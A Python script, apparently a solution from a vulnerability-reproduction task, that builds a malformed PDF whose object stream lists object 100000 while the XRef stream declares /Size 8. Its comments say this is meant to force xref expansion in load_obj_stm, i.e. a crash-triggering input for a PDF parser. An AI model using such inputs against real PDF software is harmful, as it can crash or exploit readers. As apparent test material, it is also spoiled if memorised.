import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Helper to pack numbers for XRef stream fields
        def pack_num(n: int, width: int) -> bytes:
            return n.to_bytes(width, byteorder='big', signed=False)

        # Build PDF header
        pdf_parts = []
        header = b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"
        pdf_parts.append(header)

        # Parameters for objects
        R = 2  # Root object number (compressed in object stream)
        T = 100000  # Large object number to force xref expansion in load_obj_stm
        S = 5  # Object stream object number
        X = 7  # XRef stream object number

        # Build the object stream (object S)
        # Object contents inside the ObjStm
        objR_content = b"null"
        objT_content = b"true"

        # Offsets within the object stream content section
        off_R = 0
        # Insert newline between objects to ensure separation
        off_T = len(objR_content) + 1  # 'null' + '\n'

        # Pairs of "object_number offset" for the ObjStm
        pairs_str = f"{R} {off_R} {T} {off_T}\n".encode('ascii')

        # Stream content: pairs followed by object contents
        objstm_stream_content = pairs_str + objR_content + b"\n" + objT_content

        # Object stream dictionary
        N = 2
        First = len(pairs_str)
        Length_objstm = len(objstm_stream_content)
        objstm_dict = f"<< /Type /ObjStm /N {N} /First {First} /Length {Length_objstm} >>\n".encode('ascii')

        # Assemble object 5 (ObjStm)
        obj5_header = f"{S} 0 obj\n".encode('ascii')
        obj5_stream = b"stream\n" + objstm_stream_content + b"\nendstream\n"
        obj5_footer = b"endobj\n"
        offset_5 = sum(len(p) for p in pdf_parts)
        pdf_parts.append(obj5_header)
        pdf_parts.append(objstm_dict)
        pdf_parts.append(obj5_stream)
        pdf_parts.append(obj5_footer)

        # Prepare XRef stream contents
        # We need the offset of the XRef stream object itself
        offset_7 = sum(len(p) for p in pdf_parts)

        # XRef stream W array: [1 4 2]
        W = (1, 4, 2)

        # XRef entries for Index: [0 1, 2 1, 5 1, 7 1]
        # 0: free
        entry_0 = pack_num(0, W[0]) + pack_num(0, W[1]) + pack_num(65535, W[2])
        # 2: compressed in object stream 5, index 0
        entry_2 = pack_num(2, W[0]) + pack_num(S, W[1]) + pack_num(0, W[2])
        # 5: normal object at offset_5
        entry_5 = pack_num(1, W[0]) + pack_num(offset_5, W[1]) + pack_num(0, W[2])
        # 7: normal object at offset_7 (self)
        entry_7 = pack_num(1, W[0]) + pack_num(offset_7, W[1]) + pack_num(0, W[2])

        xref_stream_data = entry_0 + entry_2 + entry_5 + entry_7
        Length_xref = len(xref_stream_data)

        # XRef stream dictionary
        # Size can be small since we use Index; keep it below T to force expansion later
        Size = 8
        Index = f"[0 1 {R} 1 {S} 1 {X} 1]"
        W_arr = f"[{W[0]} {W[1]} {W[2]}]"
        xref_dict = f"<< /Type /XRef /W {W_arr} /Index {Index} /Size {Size} /Root {R} 0 R /Length {Length_xref} >>\n".encode('ascii')

        # Assemble object 7 (XRef stream)
        obj7_header = f"{X} 0 obj\n".encode('ascii')
        obj7_stream = b"stream\n" + xref_stream_data + b"\nendstream\n"
        obj7_footer = b"endobj\n"
        pdf_parts.append(obj7_header)
        pdf_parts.append(xref_dict)
        pdf_parts.append(obj7_stream)
        pdf_parts.append(obj7_footer)

        # startxref
        startxref = offset_7
        trailer = f"startxref\n{startxref}\n%%EOF\n".encode('ascii')
        pdf_parts.append(trailer)

        return b"".join(pdf_parts)
